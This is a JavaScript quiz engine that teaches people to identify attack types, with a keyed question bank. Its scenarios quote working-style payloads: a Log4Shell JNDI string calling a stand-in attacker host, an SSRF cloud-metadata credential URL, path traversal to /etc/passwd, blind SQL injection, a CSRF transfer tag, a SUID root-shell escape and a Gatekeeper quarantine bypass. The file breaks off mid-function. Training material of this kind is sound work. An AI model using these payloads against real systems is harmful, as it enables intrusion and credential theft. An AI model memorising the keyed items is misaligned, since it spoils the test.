/**
 * CYBER ATTACK BOOK - THREAT VECTOR IDENTIFICATION MCQ ENGINE
 * 10-Question Scenario-Based Exam with Scoring & Multi-Category Re-Attempts
 */

// =============================================================================
// 1. COMPREHENSIVE CURATED QUESTION BANK ACROSS ALL MODULES & CATEGORIES
// =============================================================================

const QUIZ_QUESTION_BANK = [
  // ---------------------------------------------------------------------------
  // OWASP TOP 10 WEB APPLICATION ATTACKS (84 - 93)
  // ---------------------------------------------------------------------------
  {
    id: "q_owasp_bac",
    category: "owasp",
    categoryLabel: "OWASP Top 10",
    difficulty: "Medium",
    scenario: "A security analyst notices that an authenticated regular user at an e-commerce platform can view another customer's complete billing history and invoice PDFs by simply incrementing the numeric ID in the URL parameter from /api/invoices/1042 to /api/invoices/1043 without receiving an HTTP 403 Forbidden error.",
    question: "Which OWASP Top 10 vulnerability vector is being actively exploited in this incident?",
    correctAttackId: "broken-access-control",
    correctAttackName: "Broken Access Control (Insecure Direct Object Reference / IDOR)",
    options: [
      { id: "broken-access-control", text: "Broken Access Control (IDOR / Horizontal Privilege Escalation)" },
      { id: "cryptographic-failures", text: "Cryptographic Failures" },
      { id: "security-misconfiguration", text: "Security Misconfiguration" },
      { id: "insecure-design", text: "Insecure Design" }
    ],
    explanation: "Broken Access Control (A01:2021) occurs when server-side authorization controls fail to verify whether an authenticated caller owns the target object before returning it. Incrementing numeric identifiers to access other tenants' data is the quintessential IDOR pattern.",
    mitre: "T1548, T1078, CWE-284"
  },
  {
    id: "q_owasp_crypto",
    category: "owasp",
    categoryLabel: "OWASP Top 10",
    difficulty: "Medium",
    scenario: "A compliance audit reveals that an organization's mobile application communicates with internal payment processors over unencrypted HTTP and stores customer credit card numbers on disk using weak DES encryption with a hardcoded static encryption key embedded in the client source code.",
    question: "Which OWASP vulnerability category does this violation fall under?",
    correctAttackId: "cryptographic-failures",
    correctAttackName: "Cryptographic Failures",
    options: [
      { id: "cryptographic-failures", text: "Cryptographic Failures (A02:2021)" },
      { id: "auth-failures", text: "Identification and Authentication Failures" },
      { id: "vulnerable-components", text: "Vulnerable and Outdated Components" },
      { id: "logging-failures", text: "Security Logging and Monitoring Failures" }
    ],
    explanation: "Cryptographic Failures (A02:2021) covers transmission of sensitive data in cleartext, use of obsolete cipher algorithms (DES, MD5, RC4), and poor cryptographic key management such as hardcoded keys.",
    mitre: "T1552, CWE-327"
  },
  {
    id: "q_owasp_ssrf",
    category: "owasp",
    categoryLabel: "OWASP Top 10",
    difficulty: "High",
    scenario: "An attacker supplies the value 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role' to a web application's 'Fetch Profile Avatar from URL' feature. The server requests the URL from its internal cloud network adapter and returns the temporary AWS IAM secret access keys back in the HTTP response.",
    question: "Identify the attack technique executed against this cloud workload:",
    correctAttackId: "ssrf-attack",
    correctAttackName: "Server-Side Request Forgery (SSRF)",
    options: [
      { id: "ssrf-attack", text: "Server-Side Request Forgery (SSRF)" },
      { id: "web-directory-traversal", text: "Directory Traversal" },
      { id: "csrf", text: "Cross-Site Request Forgery (CSRF)" },
      { id: "owasp-injection", text: "SQL Injection" }
    ],
    explanation: "Server-Side Request Forgery (SSRF, A10:2021) induces the server to make unauthorized HTTP requests to arbitrary internal addresses, most notably cloud Instance Metadata Services (IMDS) at 169.254.169.254 to exfiltrate IAM tokens.",
    mitre: "T1078, CWE-918"
  },
  {
    id: "q_owasp_log4j",
    category: "owasp",
    categoryLabel: "OWASP Top 10",
    difficulty: "High",
    scenario: "A SOC team detects inbound HTTP GET requests with custom User-Agent headers formatted as '${jndi:ldap://adversary-c2.net:1389/Exploit}'. Seconds later, the Java web application initiates an outbound connection on port 1389 and executes arbitrary binary payloads in memory.",
    question: "Which OWASP risk category describes the operational hazard of deploying this vulnerable software package?",
    correctAttackId: "vulnerable-components",
    correctAttackName: "Vulnerable and Outdated Components (Log4Shell CVE-2021-44228)",
    options: [
      { id: "vulnerable-components", text: "Vulnerable and Outdated Components (A06:2021)" },
      { id: "broken-access-control", text: "Broken Access Control" },
      { id: "integrity-failures", text: "Software and Data Integrity Failures" },
      { id: "insecure-design", text: "Insecure Design" }
    ],
    explanation: "This describes exploitation of Log4Shell (CVE-2021-44228), a prime example of Vulnerable and Outdated Components (A06:2021), where software continues running unpatched third-party dependencies with known CVEs.",
    mitre: "T1190, CWE-1104"
  },
  {
    id: "q_owasp_misconfig",
    category: "owasp",
    categoryLabel: "OWASP Top 10",
    difficulty: "Easy",
    scenario: "During an external reconnaissance scan, an attacker discovers that an enterprise web server has default administrative credentials enabled ('admin'/'admin'), has directory browsing enabled, and exposes verbose stack traces containing full database connection strings upon receiving an HTTP 500 error.",
    question: "Which threat category best classifies this vulnerability?",
    correctAttackId: "security-misconfiguration",
    correctAttackName: "Security Misconfiguration",
    options: [
      { id: "security-misconfiguration", text: "Security Misconfiguration (A05:2021)" },
      { id: "owasp-injection", text: "Injection" },
      { id: "cryptographic-failures", text: "Cryptographic Failures" },
      { id: "auth-failures", text: "Identification and Authentication Failures" }
    ],
    explanation: "Security Misconfiguration (A05:2021) encompasses unhardened server setups, default passwords, unnecessary services, permissive CORS policies, and verbose debug error outputs.",
    mitre: "T1078, CWE-16"
  },

  // ---------------------------------------------------------------------------
  // OTHER WEB APPLICATION ATTACKS (94 - 100)
  // ---------------------------------------------------------------------------
  {
    id: "q_web_smuggling",
    category: "other-web",
    categoryLabel: "Other Web Application Attacks",
    difficulty: "High",
    scenario: "An adversary sends specially crafted HTTP/1.1 requests containing conflicting 'Content-Length' and 'Transfer-Encoding: chunked' headers. The front-end reverse proxy processes the Content-Length header, while the back-end application server prioritizes Transfer-Encoding, causing subsequent victim requests on the same keep-alive connection to execute attacker payloads.",
    question: "Which advanced web application attack technique is taking place?",
    correctAttackId: "http-request-smuggling",
    correctAttackName: "HTTP Request Smuggling (HRS)",
    options: [
      { id: "http-request-smuggling", text: "HTTP Request Smuggling (CL.TE / TE.CL Desync)" },
      { id: "csrf", text: "Cross-Site Request Forgery (CSRF)" },
      { id: "web-xss", text: "Cross-Site Scripting (XSS)" },
      { id: "web-directory-traversal", text: "Directory Traversal" }
    ],
    explanation: "HTTP Request Smuggling (CWE-444) exploits discrepancies between front-end and back-end HTTP parsers regarding request boundaries, enabling cache poisoning and credential hijacking.",
    mitre: "T1190, CWE-444"
  },
  {
    id: "q_web_traversal",
    category: "other-web",
    categoryLabel: "Other Web Application Attacks",
    difficulty: "Easy",
    scenario: "An attacker intercepts a request to 'GET /download.php?file=report.pdf' and modifies the parameter value to 'GET /download.php?file=../../../../etc/passwd'. The server returns the plaintext user account database of the underlying Linux host.",
    question: "Identify the attack vector demonstrated above:",
    correctAttackId: "web-directory-traversal",
    correctAttackName: "Directory Traversal (Path Traversal)",
    options: [
      { id: "web-directory-traversal", text: "Directory Traversal (Path Traversal)" },
      { id: "web-code-injection", text: "Code Injection (RCE)" },
      { id: "input-filtering-attack", text: "Input Filtering Attack" },
      { id: "csrf", text: "Cross-Site Request Forgery" }
    ],
    explanation: "Directory Traversal (CWE-22) utilizes '../' sequence strings to break out of the designated web root folder and read arbitrary files from the server's file system.",
    mitre: "T1006, CWE-22"
  },
  {
    id: "q_web_csrf",
    category: "other-web",
    categoryLabel: "Other Web Application Attacks",
    difficulty: "Medium",
    scenario: "A victim logged into their banking web app visits an untrusted forum. An embedded hidden HTML image tag '<img src=\"https://bank.com/transfer?amount=5000&to=attacker\">' automatically triggers an authorized money transfer in the background using the victim's ambient browser cookies without anti-CSRF token verification.",
    question: "What class of web security vulnerability was exploited?",
    correctAttackId: "csrf",
    correctAttackName: "Cross-Site Request Forgery (CSRF)",
    options: [
      { id: "csrf", text: "Cross-Site Request Forgery (CSRF)" },
      { id: "web-xss", text: "Cross-Site Scripting (XSS)" },
      { id: "http-request-smuggling", text: "HTTP Request Smuggling" },
      { id: "broken-access-control", text: "Broken Access Control" }
    ],
    explanation: "CSRF forces an authenticated browser to transmit state-altering requests using stored session cookies without the user's explicit consent, prevented using Anti-CSRF Synchronizer Tokens and SameSite cookies.",
    mitre: "T1566, CWE-352"
  },

  // ---------------------------------------------------------------------------
  // DATABASE ATTACKS (101 - 105)
  // ---------------------------------------------------------------------------
  {
    id: "q_db_blind_sqli",
    category: "database",
    categoryLabel: "Database Attacks",
    difficulty: "High",
    scenario: "An attacker injects \"' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin')--\" into an input field. The web page does not display database errors, but delays its HTTP response by 5 seconds when the condition evaluates to true.",
    question: "Which database attack vector is being employed?",
    correctAttackId: "blind-sql-injection",
    correctAttackName: "Blind SQL Injection (Time-Based Inferential)",
    options: [
      { id: "blind-sql-injection", text: "Blind SQL Injection (Time-Based / Inferential)" },
      { id: "db-privilege-escalation", text: "Database Privilege Escalation" },
      { id: "unauthorized-db-access", text: "Unauthorized Database Access" },
      { id: "db-enumeration", text: "Database Enumeration" }
    ],
    explanation: "Blind SQL Injection occurs when an application suppresses database output and errors, forcing the adversary to reconstruct database contents character-by-character through time delays (pg_sleep, WAITFOR DELAY) or boolean states.",
    mitre: "T1190, CWE-89"
  },
  {
    id: "q_db_privesc",
    category: "database",
    categoryLabel: "Database Attacks",
    difficulty: "Medium",
    scenario: "An attacker with a low-privileged application database user account executes a stored procedure compiled with 'SECURITY DEFINER'. Due to unquoted search_path variables, the procedure executes an attacker-created malicious function under the DBA (postgres superuser) security context, granting the attacker full administrative control.",
    question: "Identify the database-specific attack vector:",
    correctAttackId: "db-privilege-escalation",
    correctAttackName: "Database Privilege Escalation",
    options: [
      { id: "db-privilege-escalation", text: "Database Privilege Escalation" },
      { id: "blind-sql-injection", text: "Blind SQL Injection" },
      { id: "db-enumeration", text: "Database Enumeration" },
      { id: "unauthorized-db-access", text: "Unauthorized Database Access" }
    ],
    explanation: "Database Privilege Escalation involves exploiting flawed DEFINER functions, unquoted search paths, or database engine bugs to elevate a restricted user to DBA/sysadmin superuser status.",
    mitre: "T1068, T1078"
  },
  {
    id: "q_db_enum",
    category: "database",
    categoryLabel: "Database Attacks",
    difficulty: "Medium",
    scenario: "Telemetry logs reveal rapid iterative SQL queries querying 'SELECT table_name, column_name FROM information_schema.columns' and 'SELECT schema_name FROM information_schema.schemata' to discover database table definitions and locate credit card numbers and password columns.",
    question: "What specific database attack phase is being conducted?",
    correctAttackId: "db-enumeration",
    correctAttackName: "Database Enumeration",
    options: [
      { id: "db-enumeration", text: "Database Enumeration (Schema & Metadata Scraping)" },
      { id: "unauthorized-db-access", text: "Unauthorized Database Access" },
      { id: "data-tampering", text: "Data Tampering" },
      { id: "db-privilege-escalation", text: "Database Privilege Escalation" }
    ],
    explanation: "Database Enumeration is the systematic mapping of database engine metadata, schemas, table names, and column types using information_schema or sys.tables to prepare for data extraction.",
    mitre: "T1087, T1082"
  },

  // ---------------------------------------------------------------------------
  // STORAGE SECURITY ATTACKS (106 - 110)
  // ---------------------------------------------------------------------------
  {
    id: "q_storage_leakage",
    category: "storage",
    categoryLabel: "Storage Security Attacks",
    difficulty: "Easy",
    scenario: "A cloud security audit flags an Amazon S3 bucket containing confidential medical patient charts with an ACL granting 'AllUsers' (public internet) read permissions, allowing anyone with the bucket URL to download HIPAA-protected PDF documents without authentication.",
    question: "Which storage security threat vector does this event represent?",
    correctAttackId: "data-leakage",
    correctAttackName: "Data Leakage (Public Cloud Storage Exposure)",
    options: [
      { id: "data-leakage", text: "Data Leakage (Cloud Storage Exposure)" },
      { id: "data-tampering", text: "Data Tampering" },
      { id: "data-destruction", text: "Data Destruction" },
      { id: "data-exfiltration", text: "Data Exfiltration" }
    ],
    explanation: "Data Leakage at the storage tier occurs when confidential enterprise records are accidentally or carelessly exposed to unauthorized parties, typically through misconfigured public S3 bucket ACLs.",
    mitre: "T1530, CWE-200"
  },
  {
    id: "q_storage_destruction",
    category: "storage",
    categoryLabel: "Storage Security Attacks",
    difficulty: "Medium",
    scenario: "A nation-state threat actor gains access to storage management consoles, issues commands to delete all cloud volume snapshots, overwrites storage array disks with zero-filled blocks, and disables shadow copies, permanently preventing enterprise disaster recovery.",
    question: "Identify the critical storage attack technique:",
    correctAttackId: "data-destruction",
    correctAttackName: "Data Destruction (Wiper / Storage Erasure)",
    options: [
      { id: "data-destruction", text: "Data Destruction (Wiper & Storage Erasure)" },
      { id: "data-tampering", text: "Data Tampering" },
      { id: "data-exfiltration", text: "Data Exfiltration" },
      { id: "unauthorized-data-access", text: "Unauthorized Data Access" }
    ],
    explanation: "Data Destruction (T1485) involves intentional, irreversible erasure or zero-fill wiping of enterprise storage volumes, snapshots, and backups to paralyze business operations.",
    mitre: "T1485, NIST SP 800-34"
  },
  {
    id: "q_storage_tampering",
    category: "storage",
    categoryLabel: "Storage Security Attacks",
    difficulty: "Medium",
    scenario: "An insider threat modifies financial transaction records in an S3 blob repository by altering invoice amounts and replacing bank routing numbers before downstream automated ERP processing occurs, without leaving cryptographic hash audit alarms.",
    question: "Which storage security violation has taken place?",
    correctAttackId: "data-tampering",
    correctAttackName: "Data Tampering (Integrity Subversion)",
    options: [
      { id: "data-tampering", text: "Data Tampering (Integrity Subversion)" },
      { id: "data-destruction", text: "Data Destruction" },
      { id: "data-leakage", text: "Data Leakage" },
      { id: "data-exfiltration", text: "Data Exfiltration" }
    ],
    explanation: "Data Tampering represents unauthorized alteration, replacement, or falsification of stored data, subverting data integrity. It is mitigated using WORM (Write Once Read Many) storage and HMAC signing.",
    mitre: "STRIDE Tampering, ISO 27001"
  },

  // ---------------------------------------------------------------------------
  // NETWORK INFRASTRUCTURE ATTACKS (01 - 05)
  // ---------------------------------------------------------------------------
  {
    id: "q_net_arp_spoofing",
    category: "network",
    categoryLabel: "Network Infrastructure Attacks",
    difficulty: "Medium",
    scenario: "An attacker on a corporate local area network sends unsolicited gratuitous ARP replies associating the default gateway IP address (192.168.1.1) with the attacker's network MAC address (AA:BB:CC:DD:EE:FF), causing client switches to divert all outbound network traffic through the attacker's machine.",
    question: "Which Layer 2 network attack vector is being executed?",
    correctAttackId: "arp-spoofing",
    correctAttackName: "ARP Spoofing (ARP Cache Poisoning)",
    options: [
      { id: "arp-spoofing", text: "ARP Spoofing (ARP Cache Poisoning)" },
      { id: "dns-spoofing", text: "DNS Spoofing" },
      { id: "dos", text: "Denial-of-Service (SYN Flood)" },
      { id: "mac-flooding", text: "MAC Flooding" }
    ],
    explanation: "ARP Spoofing involves broadcasting fraudulent ARP reply packets to link an attacker's MAC address with a legitimate IP address, enabling Man-in-the-Middle eavesdropping.",
    mitre: "T1557.002"
  },
  {
    id: "q_net_dns_spoofing",
    category: "network",
    categoryLabel: "Network Infrastructure Attacks",
    difficulty: "Medium",
    scenario: "An attacker floods a recursive DNS resolver with forged response packets containing fraudulent DNS A records for 'bank.com' pointing to an IP address hosted on the attacker's server, predicting the DNS transaction ID before the authoritative DNS nameserver responds.",
    question: "Identify the network attack vector:",
    correctAttackId: "dns-spoofing",
    correctAttackName: "DNS Spoofing (DNS Cache Poisoning / Kaminsky Attack)",
    options: [
      { id: "dns-spoofing", text: "DNS Spoofing (DNS Cache Poisoning)" },
      { id: "arp-spoofing", text: "ARP Spoofing" },
      { id: "mitm", text: "Man-in-the-Middle" },
      { id: "ddos", text: "Distributed Denial-of-Service" }
    ],
    explanation: "DNS Spoofing corrupts DNS cache tables with forged IP mapping records, transparently redirecting user domain requests to malicious IP addresses.",
    mitre: "T1584.002, T1557"
  },

  // ---------------------------------------------------------------------------
  // CORE OS & MEMORY ATTACKS (06 - 10, 80 - 83)
  // ---------------------------------------------------------------------------
  {
    id: "q_os_bof",
    category: "os",
    categoryLabel: "Core OS & Memory Attacks",
    difficulty: "High",
    scenario: "An adversary sends an oversized payload containing 256 'A' characters followed by a memory address into a legacy C network daemon that uses strcpy() without bounds checking, overwriting the stack frame pointer and return address (EIP/RIP) to execute a shellcode payload.",
    question: "Which classic low-level vulnerability is being exploited?",
    correctAttackId: "buffer-overflow",
    correctAttackName: "Buffer Overflow (Stack-Based Smashing)",
    options: [
      { id: "buffer-overflow", text: "Buffer Overflow (Stack-Based Memory Corruption)" },
      { id: "format-string-attack", text: "Format String Attack" },
      { id: "race-condition-attack", text: "Race Condition (TOCTOU)" },
      { id: "process-injection", text: "Process Injection" }
    ],
    explanation: "Buffer Overflow occurs when user data exceeds buffer boundaries in memory-unsafe languages (C/C++), overwriting adjacent stack memory such as the saved instruction pointer (EIP/RIP).",
    mitre: "T1203, CWE-121"
  },
  {
    id: "q_os_toctou",
    category: "os",
    categoryLabel: "Core OS & Memory Attacks",
    difficulty: "High",
    scenario: "A root daemon checks if a temporary file '/tmp/output.log' is owned by a regular user using access(), then opens it for writing using open() a microsecond later. An attacker rapidly swaps the file with a symbolic link pointing to '/etc/shadow' between the two calls, causing the daemon to overwrite the password database.",
    question: "What specific concurrency attack pattern was executed?",
    correctAttackId: "race-condition-attack",
    correctAttackName: "Race Condition Attack (TOCTOU & Symlink Swap)",
    options: [
      { id: "race-condition-attack", text: "Race Condition Attack (TOCTOU & Symlink Swap)" },
      { id: "buffer-overflow", text: "Buffer Overflow" },
      { id: "format-string-attack", text: "Format String Attack" },
      { id: "rootkit-attack", text: "Kernel Rootkit Attack" }
    ],
    explanation: "Time-of-Check to Time-of-Use (TOCTOU) race conditions exploit the temporal window between resource verification and consumption, allowing attackers to swap resources via symlinks.",
    mitre: "T1548, CWE-367"
  },

  // ---------------------------------------------------------------------------
  // PASSWORD & CREDENTIAL ATTACKS (31 - 39)
  // ---------------------------------------------------------------------------
  {
    id: "q_pwd_spraying",
    category: "password",
    categoryLabel: "Password Attacks & Cracking",
    difficulty: "Medium",
    scenario: "SOC alerts show a single external IP address attempting to authenticate against 10,000 corporate Active Directory user accounts using only two passwords ('SeasonYear2026!' and 'Welcome123!') spaced 45 minutes apart, purposefully staying below the 5-attempt account lockout threshold.",
    question: "Which credential penetration technique is being deployed?",
    correctAttackId: "password-spraying",
    correctAttackName: "Password Spraying Attack",
    options: [
      { id: "password-spraying", text: "Password Spraying Attack (Horizontal Enumeration)" },
      { id: "brute-force-attack", text: "Online Brute-Force Attack" },
      { id: "credential-stuffing", text: "Automated Credential Stuffing" },
      { id: "rainbow-table-attack", text: "Rainbow Table Attack" }
    ],
    explanation: "Password Spraying tests a few common passwords horizontally across thousands of user accounts to avoid triggering vertical account lockout policies.",
    mitre: "T1110.003"
  },
  {
    id: "q_pwd_stuffing",
    category: "password",
    categoryLabel: "Password Attacks & Cracking",
    difficulty: "Medium",
    scenario: "A commercial banking portal receives 400,000 automated login requests per hour using millions of username/password pairs recently dumped from a third-party social media breach, attempting to hijack accounts where users reuse credentials.",
    question: "What attack vector does this automated attack represent?",
    correctAttackId: "credential-stuffing",
    correctAttackName: "Automated Credential Stuffing",
    options: [
      { id: "credential-stuffing", text: "Automated Credential Stuffing (Breach Replay)" },
      { id: "password-spraying", text: "Password Spraying" },
      { id: "dictionary-attack", text: "Dictionary Attack" },
      { id: "keylogger-attack", text: "Keylogger Attack" }
    ],
    explanation: "Credential Stuffing is the automated replay of stolen username/password pairs from previous external breaches against different applications, relying on credential reuse.",
    mitre: "T1110.004"
  },

  // ---------------------------------------------------------------------------
  // WINDOWS ACTIVE DIRECTORY & HOST SECURITY (65 - 69)
  // ---------------------------------------------------------------------------
  {
    id: "q_win_kerberoast",
    category: "windows",
    categoryLabel: "Windows Active Directory & OS",
    difficulty: "High",
    scenario: "An authenticated domain user queries Active Directory for user accounts configured with Service Principal Names (SPNs), requests valid TGS Kerberos service tickets for 'MSSQLSvc/db01.corp', extracts the RC4/AES encrypted tickets from RAM, and takes them offline for high-speed GPU hash cracking.",
    question: "Identify the Active Directory privilege escalation attack:",
    correctAttackId: "kerberoasting",
    correctAttackName: "Active Directory Kerberoasting Attack",
    options: [
      { id: "kerberoasting", text: "Active Directory Kerberoasting Attack" },
      { id: "pass-the-hash", text: "Pass-the-Hash Attack" },
      { id: "null-session-attack", text: "Null Session Attack" },
      { id: "windows-privilege-escalation", text: "Token Impersonation" }
    ],
    explanation: "Kerberoasting extracts Kerberos TGS tickets requested for accounts with SPNs, cracking the encrypted service ticket offline with Hashcat to recover the service account plaintext password.",
    mitre: "T1558.003"
  },
  {
    id: "q_win_pth",
    category: "windows",
    categoryLabel: "Windows Active Directory & OS",
    difficulty: "Medium",
    scenario: "An attacker dumps the LSASS memory space on a compromised Windows workstation to retrieve an administrator's NTLM hash. Without cracking the hash into plaintext, the attacker transmits the raw NTLM hash via SMB to authenticate directly to other servers on the network.",
    question: "What post-exploitation lateral movement technique was used?",
    correctAttackId: "pass-the-hash",
    correctAttackName: "Windows Pass-the-Hash Attack (PtH)",
    options: [
      { id: "pass-the-hash", text: "Pass-the-Hash Attack (NTLM Replay)" },
      { id: "kerberoasting", text: "Kerberoasting" },
      { id: "null-session-attack", text: "Null Session Attack" },
      { id: "missing-patch-exploitation", text: "Missing Patch Exploitation" }
    ],
    explanation: "Pass-the-Hash (PtH) bypasses plaintext password requirements by authenticating directly to remote hosts over NTLM/SMB using captured NTLM hashes.",
    mitre: "T1550.002"
  },

  // ---------------------------------------------------------------------------
  // LINUX & MACOS SECURITY (70 - 79)
  // ---------------------------------------------------------------------------
  {
    id: "q_linux_suid",
    category: "linux-mac",
    categoryLabel: "Linux & macOS Host Security",
    difficulty: "Medium",
    scenario: "A low-privileged Linux user searches the system with 'find / -perm -4000 2>/dev/null' and identifies that the '/usr/bin/find' binary has its SUID bit enabled. Running 'find . -exec /bin/sh -p \\;' spawns an interactive shell with effective root UID 0.",
    question: "Which Linux privilege escalation vector was leveraged?",
    correctAttackId: "suid-exploitation",
    correctAttackName: "Linux SetUID (SUID) Binary Exploitation",
    options: [
      { id: "suid-exploitation", text: "Linux SetUID (SUID) Binary Exploitation" },
      { id: "linux-nfs-attack", text: "Linux NFS no_root_squash Attack" },
      { id: "linux-rootkit-attack", text: "Linux Kernel Rootkit Attack" },
      { id: "ssh-brute-force", text: "Linux SSH Brute-Force" }
    ],
    explanation: "SUID Binary Exploitation leverages binaries running with root owner privileges that can execute subshells (GTFOBins) or load untrusted libraries.",
    mitre: "T1548.001"
  },
  {
    id: "q_mac_gatekeeper",
    category: "linux-mac",
    categoryLabel: "Linux & macOS Host Security",
    difficulty: "Medium",
    scenario: "An attacker delivers a malicious unsigned Mach-O binary packaged inside a disk image (DMG) that manipulates Apple's extended filesystem attributes ('xattr -d com.apple.quarantine') to bypass developer code-signing verification and execute on macOS Monterey.",
    question: "Which macOS security defense was bypassed?",
    correctAttackId: "gatekeeper-bypass",
    correctAttackName: "macOS Gatekeeper Bypass",
    options: [
      { id: "gatekeeper-bypass", text: "macOS Gatekeeper Bypass" },
      { id: "launch-agent-daemon-abuse", text: "LaunchAgent / LaunchDaemon Abuse" },
      { id: "macos-code-injection", text: "macOS DYLD Code Injection" },
      { id: "macos-privilege-escalation", text: "macOS TCC Bypass" }
    ],
    explanation: "Gatekeeper enforces code-signing and notarization for downloaded binaries flagged with quarantine extended attributes. Stripping or subverting quarantine flags bypasses Gatekeeper.",
    mitre: "T1553.001"
  },

  // ---------------------------------------------------------------------------
  // WIRELESS & LAYER 2 ATTACKS (40 - 54)
  // ---------------------------------------------------------------------------
  {
    id: "q_wifi_eviltwin",
    category: "wireless",
    categoryLabel: "Wireless, Rogue AP & MAC Layer",
    difficulty: "Medium",
    scenario: "An attacker sets up a rogue Wi-Fi access point broadcasting the exact SSID ('Corporate-Guest') and BSSID of the company's official network on a stronger signal channel, simultaneously transmitting 802.11 deauthentication frames to kick employees off legitimate APs and intercept their traffic.",
    question: "Identify the wireless attack technique:",
    correctAttackId: "evil-twin",
    correctAttackName: "Evil Twin Attack",
    options: [
      { id: "evil-twin", text: "Evil Twin Attack (Rogue AP with Deauth)" },
      { id: "wps-pin-attack", text: "WPS PIN Attack" },
      { id: "cam-table-overflow", text: "CAM Table Overflow" },
      { id: "mac-flooding", text: "MAC Flooding Attack" }
    ],
    explanation: "An Evil Twin mimics a legitimate Wi-Fi SSID with higher signal power, often using deauthentication packets to force clients to disconnect from legitimate APs and reconnect to the rogue hotspot.",
    mitre: "T1557"
  },
  {
    id: "q_mac_cam_overflow",
    category: "wireless",
    categoryLabel: "Wireless, Rogue AP & MAC Layer",
    difficulty: "Medium",
    scenario: "An attacker connected to a managed network switch floods the switch port with 100,000 forged Ethernet frames with random source MAC addresses per second. The switch's CAM table memory becomes exhausted, causing it to fall back into 'fail-open' hub mode and broadcast all unicast frames out all ports.",
    question: "Which Layer 2 attack vector does this describe?",
    correctAttackId: "cam-table-overflow",
    correctAttackName: "CAM Table Overflow (MAC Flooding)",
    options: [
      { id: "cam-table-overflow", text: "CAM Table Overflow (MAC Flooding / Hub Fallback)" },
      { id: "arp-spoofing", text: "ARP Spoofing" },
      { id: "mac-auth-bypass", text: "MAC Authentication Bypass" },
      { id: "rogue-dhcp", text: "Rogue DHCP Attack" }
    ],
    explanation: "CAM Table Overflow exhausts the switch's Content Addressable Memory table with bogus MAC addresses, forcing the switch to flood packets to all ports like a hub.",
    mitre: "T1557"
  },

  // ---------------------------------------------------------------------------
  // MOBILE & IOT ATTACKS (55 - 64)
  // ---------------------------------------------------------------------------
  {
    id: "q_mobile_simswap",
    category: "mobile-iot",
    categoryLabel: "Mobile & IoT Attacks",
    difficulty: "Medium",
    scenario: "An attacker impersonates an executive via social engineering against a mobile carrier's customer support agent, transferring the executive's cellular phone number to an attacker-controlled eSIM to intercept SMS-based MFA codes and take over corporate banking accounts.",
    question: "What mobile telecommunication attack was carried out?",
    correctAttackId: "sim-swapping",
    correctAttackName: "SIM Swapping Attack",
    options: [
      { id: "sim-swapping", text: "SIM Swapping Attack" },
      { id: "mobile-phishing", text: "Mobile Smishing Attack" },
      { id: "overlay-attack", text: "Android Overlay Attack" },
      { id: "mobile-malware", text: "Mobile Spyware" }
    ],
    explanation: "SIM Swapping tricks telecom carriers into reassigning a victim's phone number to a criminal's SIM card, enabling interception of SMS 2FA tokens and phone calls.",
    mitre: "T1451, T1407"
  },
  {
    id: "q_iot_botnet",
    category: "mobile-iot",
    categoryLabel: "Mobile & IoT Attacks",
    difficulty: "Easy",
    scenario: "Malware scans the public IPv4 space on TCP port 23 (Telnet) and port 554 (RTSP), logs into IP cameras and smart home routers using default factory credentials ('admin'/'admin' or 'root'/'123456'), drops an ELF binary into RAM, and coordinates 1 Tbps DDoS amplification floods.",
    question: "Which IoT threat vector does this activity typify?",
    correctAttackId: "iot-botnet",
    correctAttackName: "IoT Botnet Attack (Mirai-style)",
    options: [
      { id: "iot-botnet", text: "IoT Botnet Attack (Default Credential Propagation)" },
      { id: "firmware-exploitation", text: "Firmware Exploitation" },
      { id: "iot-mitm", text: "IoT Man-in-the-Middle" },
      { id: "sim-swapping", text: "SIM Swapping" }
    ],
    explanation: "Mirai-style IoT botnets systematically scan for exposed embedded IoT devices with factory default credentials over Telnet, enslaving them into distributed denial-of-service botnets.",
    mitre: "T1595, T1078, T1498"
  }
];

// =============================================================================
// 2. QUIZ ENGINE STATE MANAGEMENT
// =============================================================================

let currentQuizCategory = "all";
let activeQuizQuestions = []; // Array of 10 selected questions
let currentQuestionIndex = 0;
let userAnswers = {}; // { questionId: { selectedOptionId, isCorrect, submittedAt } }
let quizSubmitted = false;
let missedQuestionPool = []; // For "Retry Missed"

// Module/Category Metadata
const QUIZ_CATEGORIES = [
  { id: "all", label: "All Categories", badge: "Comprehensive 95-Vector Exam" },
  { id: "owasp", label: "OWASP Top 10 (84–93)", badge: "Web App Tier" },
  { id: "other-web", label: "Other Web Attacks (94–100)", badge: "Desync, XSS, CSRF" },
  { id: "database", label: "Database Attacks (101–105)", badge: "Blind SQLi, PrivEsc" },
  { id: "storage", label: "Storage Security (106–110)", badge: "Leakage, Wipers" },
  { id: "network", label: "Network Infrastructure (01–05)", badge: "ARP, DNS, DDoS" },
  { id: "os", label: "Core OS & Memory (06–10, 80–83)", badge: "BoF, TOCTOU" },
  { id: "password", label: "Password & Cracking (31–39)", badge: "Spraying, Stuffing" },
  { id: "wireless", label: "Wireless & Layer 2 (40–54)", badge: "Evil Twin, CAM" },
  { id: "windows", label: "Windows Active Directory (65–69)", badge: "Kerberoast, PtH" },
  { id: "linux-mac", label: "Linux & macOS Security (70–79)", badge: "SUID, Gatekeeper" },
  { id: "mobile-iot", label: "Mobile & IoT Attacks (55–64)", badge: "SIM Swap, Botnets" }
];

document.addEventListener("DOMContentLoaded", () => {
  initQuiz();
});

function initQuiz() {
  renderCategoryFilterPills();
  startNewQuiz(currentQuizCategory);
  
  // Connect top nav button
  const btnQuiz = document.getElementById("btn-mode-quiz");
  if (btnQuiz) {
    btnQuiz.addEventListener("click", () => {
      if (typeof switchAppMode === "function") {
        switchAppMode("quiz");
      }
    });
  }
}

// =============================================================================
// 3. QUESTION SAMPLING & GENERATION ENGINE
// =============================================================================

function generate10Questions(categoryId) {
  // 1. Gather all candidates matching the category
  let pool = [];
  if (categoryId === "all") {
    pool = [...QUIZ_QUESTION_BANK];
  } else {
    pool = QUIZ_QUESTION_BANK.filter(q => q.category === categoryId);
  }

  // If pool has fewer than 10 questions (or for broader dynamic variation),
  // dynamically generate additional scenario questions from ATTACKS_DATA in app.js!
  if (pool.length < 10 && typeof ATTACKS_DATA !== "undefined") {
    const dynamicPool = generateDynamicQuestionsFromAttacks(categoryId, 10 - pool.length, pool.map(q => q.correctAttackId));
    pool = pool.concat(dynamicPool);
  }

  // Shuffle pool using Fisher-Yates
  const shuffled = shuffleArray([...pool]);

  // If still fewer than 10 (edge case), pad with general attacks
  if (shuffled.length < 10 && typeof ATTACKS_DATA !== "undefined") {
